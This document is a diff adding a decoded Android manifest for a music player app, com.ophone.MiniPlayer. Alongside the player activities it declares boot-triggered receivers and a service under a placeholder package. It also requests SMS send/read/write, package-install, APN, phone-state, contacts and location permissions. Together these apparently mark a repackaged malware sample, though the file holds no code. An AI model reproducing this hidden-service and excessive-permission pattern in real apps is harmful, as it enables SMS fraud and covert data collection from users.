@@ -1,0 +1,127 @@
+manifest
+- package: com.ophone.MiniPlayer
+- versionName: 1.0
+- versionCode: 1
+	application
+	- icon: 2130837523
+	- theme: 2131099654
+	- label: 2131034113
+		activity
+		- name: .LogoActivity
+		- label: 2131034113
+			intent-filter
+				action
+				- name: android.intent.action.MAIN
+				category
+				- name: android.intent.category.LAUNCHER
+		activity
+		- name: .MainActivity
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		activity
+		- name: .MyPlayer
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		activity
+		- name: .MusicActivity
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		activity
+		- name: .MusicFeedActivity
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		activity
+		- name: .OnlineMusicActivity
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		activity
+		- name: .PlayingListActivity
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		activity
+		- name: .lyricsactivity
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		activity
+		- name: .Search
+			intent-filter
+				action
+				- name: android.intent.action.VIEW
+				category
+				- name: android.intent.category.DEFAULT
+		service
+		- name: MyPlayerService
+		receiver
+		- name: com.xxx.yyy.MyBoolService
+			intent-filter
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+		receiver
+		- name: com.xxx.yyy.MyAlarmReceiver
+			intent-filter
+				action
+				- name: com.lz.myservicestart
+		service
+		- name: com.xxx.yyy.MyService
+		- enabled: true
+	uses-sdk
+	- minSdkVersion: 3
+	uses-permission
+	- name: android.permission.READ_CONTACTS
+	uses-permission
+	- name: android.permission.MOUNT_UNMOUNT_FILESYSTEMS
+	uses-permission
+	- name: android.permission.WRITE_EXTERNAL_STORAGE
+	uses-permission
+	- name: android.permission.INTERNET
+	uses-permission
+	- name: android.permission.INSTALL_PACKAGES
+	uses-permission
+	- name: android.permission.BROADCAST_PACKAGE_REMOVED
+	uses-permission
+	- name: android.permission.WRITE_SETTINGS
+	uses-permission
+	- name: android.permission.RESTART_PACKAGES
+	uses-permission
+	- name: android.permission.WRITE_APN_SETTINGS
+	uses-permission
+	- name: android.permission.ACCESS_FINE_LOCATION
+	uses-permission
+	- name: android.permission.ACCESS_COARSE_LOCATION
+	uses-permission
+	- name: android.permission.RECEIVE_BOOT_COMPLETED
+	uses-permission
+	- name: android.permission.ACCESS_NETWORK_STATE
+	uses-permission
+	- name: android.permission.READ_PHONE_STATE
+	uses-permission
+	- name: android.permission.SEND_SMS
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.READ_SMS
+	uses-permission
+	- name: android.permission.WRITE_SMS
+	uses-permission
+	- name: android.permission.MODIFY_PHONE_STATE
